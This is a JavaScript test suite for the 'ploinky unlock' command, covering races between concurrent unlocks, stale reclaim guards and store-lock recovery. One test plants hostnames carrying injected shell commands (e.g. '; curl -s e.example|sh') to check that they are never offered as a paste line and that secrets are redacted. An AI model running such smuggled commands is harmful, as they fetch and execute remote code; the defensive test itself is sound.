import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { buildWorkspaceIdentity } from '../../ploinky-box/identity.mjs';
import { createLockLiveness, LIVENESS } from '../../ploinky-box/lockLiveness.mjs';
import { createMutationLockManager } from '../../ploinky-box/locks.mjs';
import { formatUnlockReport, unlockWorkspace } from '../../ploinky-box/unlock.mjs';

// Concurrent `ploinky unlock` runs. Unlock commands for one workspace are
// serialized by `locks/unlock.lock`; on top of that, a guard that vanished or
// was replaced between the judgement and the removal is never an error and is
// never removed.

const worker = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixtures', 'unlockRaceWorker.mjs');
const MACHINE = 'm'.repeat(32);
// Above every PID limit: kill(pid, 0) reports ESRCH.
const DEAD_PID = 2147483646;

function fixture(t) {
    const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'ploinky-box-unlock-race-')));
    t.after(() => fs.rmSync(root, { recursive: true, force: true }));
    return root;
}

function workspaceIn(root, name = 'workspace') {
    const workspace = path.join(root, name);
    fs.mkdirSync(workspace);
    return { workspace, identity: buildWorkspaceIdentity(workspace) };
}

const locksOf = (workspace) => path.join(workspace, '.ploinky-box', 'locks');
const lockPathOf = (workspace) => path.join(locksOf(workspace), 'workspace.lock');
const guardPathOf = (workspace) => `${lockPathOf(workspace)}.reclaim`;
const unlockLockOf = (workspace) => path.join(locksOf(workspace), 'unlock.lock');

// `dead` PIDs are stale, `undetermined` unclassifiable, every other PID live.
function fakeLiveness({ dead = [], undetermined = [] } = {}) {
    const local = { hostname: 'test-host', machineId: MACHINE, bootId: '11111111-1111-4111-8111-111111111111', pidNamespace: 'pid:[1]' };
    return {
        localIdentity: () => local,
        selfFields: () => ({ ...local, pid: 4242, processStart: 'linux:4242' }),
        processStart: (value) => `linux:${value}`,
        classify(owner) {
            if (dead.includes(owner.pid)) return { state: LIVENESS.stale, reason: 'its process no longer exists' };
            if (undetermined.includes(owner.pid)) return { state: LIVENESS.undetermined, reason: 'it is held on another machine' };
            return { state: LIVENESS.live, reason: 'its process is running' };
        },
    };
}

function owner(overrides = {}) {
    return {
        schema: 'ploinky-lock', version: 2, label: 'workspace', instance: null, workspaceRoot: null,
        hostname: 'test-host', machineId: MACHINE, bootId: '11111111-1111-4111-8111-111111111111',
        pidNamespace: 'pid:[1]', pid: 101, processStart: 'linux:1', startedAt: new Date(0).toISOString(),
        ...overrides,
    };
}

function plantDirectory(directory, record) {
    fs.mkdirSync(directory, { recursive: true, mode: 0o700 });
    if (record !== undefined) fs.writeFileSync(path.join(directory, 'owner.json'), `${JSON.stringify(record)}\n`, { mode: 0o600 });
    return directory;
}

function storeLockPathOf(identity) {
    return path.join(identity.workspaceRoot, '.ploinky-box', 'hardware-limits', identity.instance, 'store', 'write.lock');
}

function plantStoreLock(identity, record) {
    const lockPath = storeLockPathOf(identity);
    fs.mkdirSync(path.dirname(lockPath), { recursive: true, mode: 0o700 });
    fs.writeFileSync(lockPath, `${JSON.stringify(record)}\n`, { mode: 0o600 });
    return lockPath;
}

function storeOwner(overrides = {}) {
    return { token: 'a'.repeat(32), pid: DEAD_PID, hostname: os.hostname(), domain: 'host', operation: 'set_agent_limits',
        acquiredAt: new Date(0).toISOString(), ...overrides };
}

function unlock(identity, liveness, { fsApi = fs, unlockWaitMs = 50, box = 'absent' } = {}) {
    return unlockWorkspace({
        identity,
        lockManager: createMutationLockManager({ liveness, retryMs: 1, timeoutMs: 200 }),
        observeBoxState: () => ({ state: box }),
        fsApi,
        unlockWaitMs,
    });
}

const states = (report) => report.items.map((entry) => `${entry.kind}:${entry.state}`);

// S1 (review): the other unlock retires the judged guard just before this
// one moves it. The rename finds nothing: the guard is reported as removed by
// another command, and the workspace lock and store lock steps still run.
test('S1: a guard that vanishes before it is moved is absent, and the later steps still run', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const guard = plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));
    plantDirectory(lockPathOf(workspace), owner({ pid: 191 }));
    const storeLock = plantStoreLock(identity, storeOwner());
    let fired = false;
    const fsApi = {
        ...fs,
        renameSync(from, to) {
            if (from === guard && !fired) {
                fired = true;
                fs.rmSync(guard, { recursive: true });
            }
            return fs.renameSync(from, to);
        },
    };
    const report = await unlock(identity, fakeLiveness({ dead: [190, 191] }), { fsApi });
    assert.equal(fired, true);
    assert.deepEqual(states(report), ['reclaim-guard:absent', 'workspace-lock:removed', 'store-lock:removed']);
    assert.match(report.items[0].reason, /removed by another command/);
    assert.equal(report.exitCode, 0);
    assert.equal(fs.existsSync(storeLock), false);
    assert.deepEqual(fs.readdirSync(locksOf(workspace)), [], 'no lock, guard or debris is left');
    assert.match(formatUnlockReport(report), /reclaim guard .*: not present \(removed by another command while it was inspected\)\./);
});

// The same, when the guard vanishes at the re-check instead of at the move.
test('S1: a guard that vanishes at the re-check is absent, never a raw error', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const guard = plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));
    let reads = 0;
    const fsApi = {
        ...fs,
        lstatSync(target, ...rest) {
            if (target === guard && rest[0]?.bigint && ++reads === 2) fs.rmSync(guard, { recursive: true });
            return fs.lstatSync(target, ...rest);
        },
    };
    const report = await unlock(identity, fakeLiveness({ dead: [190] }), { fsApi });
    assert.equal(reads >= 2, true);
    assert.deepEqual(states(report), ['reclaim-guard:absent', 'workspace-lock:absent', 'store-lock:absent']);
    assert.match(report.items[0].reason, /removed by another command/);
});

// S2 (review): in the same instant, a running command's reclaim creates a
// fresh guard at that path. The move takes that live guard; it is not the
// judged directory, so it is moved back, never deleted.
test('S2: a live guard that replaced the judged one is never removed', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const guard = plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));
    plantDirectory(lockPathOf(workspace), owner({ pid: 191 }));
    let replacement = null;
    const fsApi = {
        ...fs,
        renameSync(from, to) {
            if (from === guard && !replacement) {
                fs.rmSync(guard, { recursive: true });
                plantDirectory(guard, owner({ pid: 555 }));
                replacement = fs.lstatSync(guard).ino;
            }
            return fs.renameSync(from, to);
        },
    };
    const report = await unlock(identity, fakeLiveness({ dead: [190, 191] }), { fsApi });
    assert.notEqual(replacement, null);
    assert.equal(report.items[0].state, 'kept');
    assert.match(report.items[0].reason, /another guard took its place/);
    assert.equal(report.items[1].state, 'kept', 'the workspace lock is not touched while a guard is in place');
    assert.equal(fs.lstatSync(guard).ino, replacement, 'the live guard is the same directory, under its name');
    assert.equal(JSON.parse(fs.readFileSync(path.join(guard, 'owner.json'), 'utf8')).pid, 555);
    assert.equal(JSON.parse(fs.readFileSync(path.join(lockPathOf(workspace), 'owner.json'), 'utf8')).pid, 191);
    assert.deepEqual(fs.readdirSync(locksOf(workspace)).sort(), ['workspace.lock', 'workspace.lock.reclaim']);
});

// The other steps follow the same rule: a lock that vanishes under a read
// or a move is absent, never a raw error.
test('a workspace lock or store lock that vanishes while it is handled is absent, never a raw error', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const lockPath = plantDirectory(lockPathOf(workspace), owner({ pid: 191 }));
    fs.writeFileSync(path.join(lockPath, 'journal.json'), 'leftover\n');
    const storeLock = plantStoreLock(identity, storeOwner());
    const fsApi = {
        ...fs,
        readdirSync(target, ...rest) {
            if (target === lockPath && fs.existsSync(lockPath)) fs.rmSync(lockPath, { recursive: true });
            return fs.readdirSync(target, ...rest);
        },
    };
    let report = await unlock(identity, fakeLiveness({ dead: [191] }), { fsApi });
    assert.deepEqual(states(report), ['reclaim-guard:absent', 'workspace-lock:absent', 'store-lock:removed']);
    assert.match(report.items[1].reason, /removed by another command/);

    plantStoreLock(identity, storeOwner());
    const vanishing = {
        ...fs,
        renameSync(from, to) {
            if (from === storeLock) fs.rmSync(storeLock);
            return fs.renameSync(from, to);
        },
    };
    report = await unlock(identity, fakeLiveness(), { fsApi: vanishing });
    assert.deepEqual(states(report), ['reclaim-guard:absent', 'workspace-lock:absent', 'store-lock:absent']);
    assert.match(report.items[2].reason, /removed by another command/);
});

// A running reclaimer between its mkdir of the guard and its owner record
// write: the guard is kept and listed, never removed, and the lock it guards
// is not touched.
test('a reclaim guard caught before its owner record is written is kept, and its lock is untouched', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const guard = plantDirectory(guardPathOf(workspace));
    plantDirectory(lockPathOf(workspace), owner({ pid: 191 }));
    const report = await unlock(identity, fakeLiveness({ dead: [191] }));
    assert.deepEqual(states(report), ['reclaim-guard:kept', 'workspace-lock:kept', 'store-lock:absent']);
    assert.match(report.items[0].reason, /no owner record \(a reclaim stopped before writing it, or is writing it now\)/);
    assert.equal(report.items[0].holder, undefined);
    assert.deepEqual(fs.readdirSync(guard), [], 'the guard is left exactly as found');
    assert.equal(JSON.parse(fs.readFileSync(path.join(lockPathOf(workspace), 'owner.json'), 'utf8')).pid, 191);
});

// The serialization itself: while another unlock holds the unlock lock, a
// second one touches nothing, even a guard it would otherwise remove.
test('a second unlock refuses while another holds the unlock lock, and touches nothing', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const guard = plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));
    plantDirectory(unlockLockOf(workspace), owner({ label: 'unlock', pid: 300 }));
    const report = await unlock(identity, fakeLiveness({ dead: [190] }));
    assert.deepEqual(states(report), ['unlock-lock:refused']);
    assert.equal(report.exitCode, 1);
    assert.match(report.items[0].reason, /another `ploinky unlock` is running for this workspace \(pid 300 on test-host/);
    assert.match(report.items[0].reason, /run it again after it finishes/);
    assert.equal(JSON.parse(fs.readFileSync(path.join(guard, 'owner.json'), 'utf8')).pid, 190, 'the stale guard is untouched');
    assert.equal(JSON.parse(fs.readFileSync(path.join(unlockLockOf(workspace), 'owner.json'), 'utf8')).pid, 300);
    const text = formatUnlockReport(report);
    assert.match(text, /^Unlock lock .*unlock\.lock: refused: another `ploinky unlock` is running/m);
    assert.match(text, /No lock was inspected or removed\./);
});

test('a second unlock waits briefly: once the first releases, it runs', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));
    const liveness = fakeLiveness({ dead: [190] });
    const manager = createMutationLockManager({ liveness, retryMs: 1, timeoutMs: 200 });
    fs.mkdirSync(locksOf(workspace), { recursive: true, mode: 0o700 });
    const first = await manager.acquireAt(unlockLockOf(workspace), 'unlock');
    const waiting = unlock(identity, liveness, { unlockWaitMs: 5000 });
    setTimeout(() => first.release(), 50);
    const report = await waiting;
    assert.deepEqual(states(report), ['reclaim-guard:removed', 'workspace-lock:absent', 'store-lock:absent']);
    assert.deepEqual(fs.readdirSync(locksOf(workspace)), []);
});

test('the unlock lock of an unlock that is no longer running is reclaimed', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    plantDirectory(unlockLockOf(workspace), owner({ label: 'unlock', pid: 301 }));
    plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));
    const report = await unlock(identity, fakeLiveness({ dead: [190, 301] }));
    assert.deepEqual(states(report), ['reclaim-guard:removed', 'workspace-lock:absent', 'store-lock:absent']);
    assert.equal(report.exitCode, 0);
    assert.deepEqual(fs.readdirSync(locksOf(workspace)), [], 'the reclaimed and the own unlock lock are both gone');
});

// Unlock never removes its own lock's reclaim guard.
test('a stuck unlock.lock.reclaim is listed with the manual step and never removed', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    const ownGuard = plantDirectory(`${unlockLockOf(workspace)}.reclaim`, owner({ label: 'unlock', pid: 302 }));
    const guard = plantDirectory(guardPathOf(workspace), owner({ pid: 190 }));

    // With a stale unlock lock behind it, the takeover is blocked: refused.
    plantDirectory(unlockLockOf(workspace), owner({ label: 'unlock', pid: 301 }));
    let report = await unlock(identity, fakeLiveness({ dead: [190, 301, 302] }));
    assert.deepEqual(states(report), ['unlock-lock:refused']);
    assert.match(report.items[0].reason, /its reclaim guard .*unlock\.lock\.reclaim is still in place, and unlock never removes its own reclaim guard/);
    let text = formatUnlockReport(report);
    assert.ok(text.includes(`Next: Inspect ${ownGuard}; once no ploinky unlock runs for this workspace, remove it by hand: rm -r -- '${ownGuard}'`), text);
    assert.equal(fs.existsSync(path.join(ownGuard, 'owner.json')), true);
    assert.equal(fs.existsSync(path.join(guard, 'owner.json')), true, 'nothing else was touched');

    // Without one, unlock runs and lists the stuck guard so it is removed before it blocks.
    fs.rmSync(unlockLockOf(workspace), { recursive: true });
    report = await unlock(identity, fakeLiveness({ dead: [190, 302] }));
    assert.deepEqual(states(report), ['reclaim-guard:removed', 'workspace-lock:absent', 'store-lock:absent', 'unlock-guard:kept']);
    assert.equal(report.exitCode, 1);
    text = formatUnlockReport(report);
    assert.ok(text.includes(`rm -r -- '${ownGuard}'`), text);
    assert.deepEqual(fs.readdirSync(locksOf(workspace)), ['unlock.lock.reclaim']);

    // A running unlock's guard is not a leftover.
    fs.rmSync(ownGuard, { recursive: true });
    plantDirectory(ownGuard, owner({ label: 'unlock', pid: 303 }));
    report = await unlock(identity, fakeLiveness());
    assert.deepEqual(states(report), ['reclaim-guard:absent', 'workspace-lock:absent', 'store-lock:absent']);
});

test('an unclassified unlock lock holder is refused with the manual step', async (t) => {
    const { workspace, identity } = workspaceIn(fixture(t));
    plantDirectory(unlockLockOf(workspace), owner({ label: 'unlock', pid: 304, machineId: 'f'.repeat(32) }));
    const report = await unlock(identity, fakeLiveness({ undetermined: [304] }), { unlockWaitMs: 20 });
    assert.deepEqual(states(report), ['unlock-lock:refused']);
    assert.match(report.items[0].reason, /cannot be classified/);
    assert.ok(formatUnlockReport(report).includes(`rm -r -- '${unlockLockOf(workspace)}'`));
    assert.equal(fs.existsSync(path.join(unlockLockOf(workspace), 'owner.json')), true);
});

// Minor 1 (review): the store lock record is Box-written. Its holder is
// offered as a `--force-holder` value only when it is one the command accepts
// and nothing in it is redacted, always single-quoted.
test('a hostile store lock holder gives no paste line and no unredacted secret', async (t) => {
    const { identity } = workspaceIn(fixture(t));
    for (const hostname of ['x; curl -s e.example|sh #token=s3cr3tvalue', 'x;curl${IFS}e|sh#token=s3cr3tvalue', 'x; curl -s e.example|sh']) {
        const storeLock = plantStoreLock(identity, storeOwner({ pid: 7, hostname }));
        const report = await unlock(identity, fakeLiveness(), { box: 'running' });
        assert.equal(report.items[2].state, 'kept', hostname);
        const text = formatUnlockReport(report);
        assert.doesNotMatch(text, /s3cr3tvalue/, text);
        assert.doesNotMatch(text, /--force-holder 7@/, text);
        assert.doesNotMatch(text, /--force-holder '7@/, text);
        const steps = text.split('\n').filter((line) => line.startsWith('  Next: '));
        assert.deepEqual(steps, [`  Next: Its owner record names no holder that --force-holder can match. Inspect ${storeLock}; once this `
            + `workspace's Box is stopped and no Ploinky command uses this store, remove it by hand: rm -- '${storeLock}'`]);
        fs.rmSync(storeLock);
    }
});

test('a valid store lock holder gives a quoted --force-holder step that the shell reads back exactly', async (t) => {
    const { identity } = workspaceIn(fixture(t));
    for (const hostname of ['other-host', "o'ther;host|x"]) {
        const storeLock = plantStoreLock(identity, storeOwner({ pid: 77, hostname }));
        const report = await unlock(identity, fakeLiveness(), { box: 'running' });
        const step = formatUnlockReport(report).split('\n').find((line) => line.startsWith('  Next: '));
        const quoted = /run: ploinky unlock --force-holder ('.*')$/.exec(step)?.[1];
        assert.ok(quoted?.startsWith("'"), step);
        assert.equal(execFileSync('/bin/sh', ['-c', `printf %s ${quoted}`], { encoding: 'utf8' }), `77@${hostname}`);
        assert.ok(step.startsWith(`  Next: If pid 77 on ${hostname} no longer runs and this workspace's Box is stopped`), step);
        // The value printed is the value that removes it.
        const forced = await unlockWorkspace({
            identity, lockManager: createMutationLockManager({ liveness: fakeLiveness(), retryMs: 1, timeoutMs: 200 }),
            observeBoxState: () => ({ state: 'absent' }), forceHolder: `77@${hostname}`,
        });
        assert.equal(forced.items[2].state, 'removed', hostname);
        assert.equal(fs.existsSync(storeLock), false);
    }
});

// Every worker is killed and awaited when its test ends, whatever the
// outcome, and is hard-killed after `limitMs`; cleanup is registered before
// anything waits on it.
function startWorker(t, role, workspace, markers, { limitMs = 60_000 } = {}) {
    const child = spawn(process.execPath, [worker, role, workspace, markers], { stdio: ['pipe', 'pipe', 'pipe'] });
    let exited = false;
    const closed = new Promise((resolve) => child.on('close', (code, signal) => { exited = true; resolve({ code, signal }); }));
    const timer = setTimeout(() => child.kill('SIGKILL'), limitMs);
    closed.then(() => clearTimeout(timer));
    t.after(async () => {
        if (!exited) child.kill('SIGKILL');
        await closed;
    });
    let stdout = '';
    let stderr = '';
    const marker = (text) => {
        const seen = new Promise((resolve, reject) => {
            child.stdout.on('data', () => { if (stdout.includes(text)) resolve(); });
            closed.then(() => (stdout.includes(text) ? resolve() : reject(new Error(`${role} worker exited before "${text.trim()}": ${stderr}`))));
        });
        seen.catch(() => {});
        return seen;
    };
    child.stdout.on('data', (chunk) => { stdout += chunk; });
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    return {
        child,
        ready: marker('ready\n'),
        inside: marker('inside\n'),
        go: () => child.stdin.write('\n'),
        async result() {
            const { code, signal } = await closed;
            const line = stdout.split('\n').find((entry) => entry.startsWith('{'));
            return { code, signal, stderr, report: line ? JSON.parse(line) : null };
        },
    };
}

function localOwner(identity, label = 'workspace') {
    const self = createLockLiveness().selfFields();
    return {
        schema: 'ploinky-lock', version: 2, label, instance: label === 'workspace' ? identity.instance : null,
        workspaceRoot: label === 'workspace' ? identity.workspaceRoot : null,
        hostname: self.hostname, machineId: self.machineId, bootId: self.bootId, pidNamespace: self.pidNamespace,
        pid: DEAD_PID, processStart: null, startedAt: new Date(0).toISOString(),
    };
}

// Real processes, real liveness. Per round: a stale guard over a stale
// workspace lock and a stale store lock; three unlocks and one ordinary
// command (whose acquisition reclaims through the same guard) start together.
// The probe in each process checks, as it happens, that no two processes hold
// the workspace lock, the guard or the unlock lock at once, and that no guard
// is removed or replaced while its creator holds it.
test('concurrent unlocks over a stale guard: one removes it, none removes a live guard, no double holder', { timeout: 180_000 }, async (t) => {
    const root = fixture(t);
    const rounds = 20;
    let refusals = 0;
    let overlapping = 0;
    for (let round = 0; round < rounds; round += 1) {
        const { workspace, identity } = workspaceIn(root, `ws-${round}`);
        const markers = path.join(root, `markers-${round}`);
        fs.mkdirSync(markers);
        plantDirectory(lockPathOf(workspace), localOwner(identity));
        plantDirectory(guardPathOf(workspace), localOwner(identity));
        const storeLock = plantStoreLock(identity, storeOwner());

        const workers = [
            startWorker(t, 'unlock', workspace, markers),
            startWorker(t, 'unlock', workspace, markers),
            startWorker(t, 'unlock', workspace, markers),
            startWorker(t, 'reclaimer', workspace, markers),
        ];
        await Promise.all(workers.map((entry) => entry.ready));
        for (const entry of workers) entry.go();
        const results = await Promise.all(workers.map((entry) => entry.result()));

        const label = `round ${round}`;
        for (const { code, stderr, report } of results) {
            assert.equal(code, 0, `${label}: ${stderr}`);
            assert.ok(report, `${label}: no report (${stderr})`);
            assert.equal(report.error, null, `${label}: ${JSON.stringify(report.error)}`);
            assert.deepEqual(report.violations, [], label);
        }
        const unlocks = results.map((entry) => entry.report).filter((report) => report.role === 'unlock');
        const reclaimer = results.map((entry) => entry.report).find((report) => report.role === 'reclaimer');
        assert.deepEqual(reclaimer.result, { acquired: true }, label);
        const guardItems = unlocks.map((report) => report.result.items.find((entry) => entry.kind === 'reclaim-guard'));
        assert.equal(guardItems.filter((entry) => entry?.state === 'removed').length, 1, `${label}: exactly one unlock removes the stale guard`);
        for (const report of unlocks) {
            const [first] = report.result.items;
            if (first.kind === 'unlock-lock') {
                assert.equal(first.state, 'refused', label);
                assert.match(first.reason, /another `ploinky unlock` is (running|taking over)/, label);
                refusals += 1;
                continue;
            }
            assert.equal(first.kind, 'reclaim-guard', label);
            // A guard kept by a loser can only be the ordinary command's: live
            // with its record, or caught between its mkdir and its record write
            // (unlocks are serialized, so no other process creates one then).
            if (first.state === 'kept') {
                assert.ok(first.holderPid === reclaimer.pid
                    || (first.holderPid === null && /no owner record/.test(first.reason)), `${label}: ${first.reason}`);
            }
            else assert.ok(['removed', 'absent'].includes(first.state), `${label}: ${first.state}`);
        }
        const spans = unlocks.map((report) => [report.started, report.finished]);
        if (spans.some(([s1, e1], i) => spans.some(([s2, e2], j) => i !== j && Math.max(s1, s2) < Math.min(e1, e2)))) overlapping += 1;
        // The store lock is recovered only by an unlock that found the
        // workspace lock free, which the ordinary command may hold at that time.
        const storeRemoved = unlocks.filter((report) => report.result.items.some((entry) => entry.kind === 'store-lock' && entry.state === 'removed'));
        assert.ok(storeRemoved.length <= 1, label);
        assert.equal(fs.existsSync(storeLock), storeRemoved.length === 0, label);
        assert.deepEqual(fs.readdirSync(locksOf(workspace)), [], `${label}: no lock, guard or debris is left`);
        assert.deepEqual(fs.readdirSync(markers), [], label);
    }
    t.diagnostic(`rounds ${rounds}, unlock refusals ${refusals}, rounds with overlapping unlocks ${overlapping}`);
    assert.ok(overlapping > 0, 'the unlock processes ran at the same time');
});

// A killed unlock leaves its unlock lock and the workspace lock it took for
// the store step; the next unlock reclaims both through the real liveness.
test('the locks of a killed unlock are reclaimed by the next unlock', { timeout: 60_000 }, async (t) => {
    const root = fixture(t);
    const { workspace, identity } = workspaceIn(root);
    const markers = path.join(root, 'markers');
    fs.mkdirSync(markers);
    fs.mkdirSync(locksOf(workspace), { recursive: true, mode: 0o700 });
    plantStoreLock(identity, storeOwner());
    const holder = startWorker(t, 'hold', workspace, markers, { limitMs: 20_000 });
    await holder.ready;
    holder.go();
    await holder.inside;
    assert.equal(JSON.parse(fs.readFileSync(path.join(unlockLockOf(workspace), 'owner.json'), 'utf8')).pid, holder.child.pid);
    assert.equal(JSON.parse(fs.readFileSync(path.join(lockPathOf(workspace), 'owner.json'), 'utf8')).pid, holder.child.pid);
    holder.child.kill('SIGKILL');
    const killed = await holder.result();
    assert.equal(killed.signal, 'SIGKILL');

    const report = await unlockWorkspace({
        identity, lockManager: createMutationLockManager({ retryMs: 5, timeoutMs: 5000 }),
        observeBoxState: () => ({ state: 'absent' }),
    });
    assert.deepEqual(states(report), ['reclaim-guard:absent', 'workspace-lock:removed', 'store-lock:removed']);
    assert.equal(report.exitCode, 0);
    assert.deepEqual(fs.readdirSync(locksOf(workspace)), []);
});
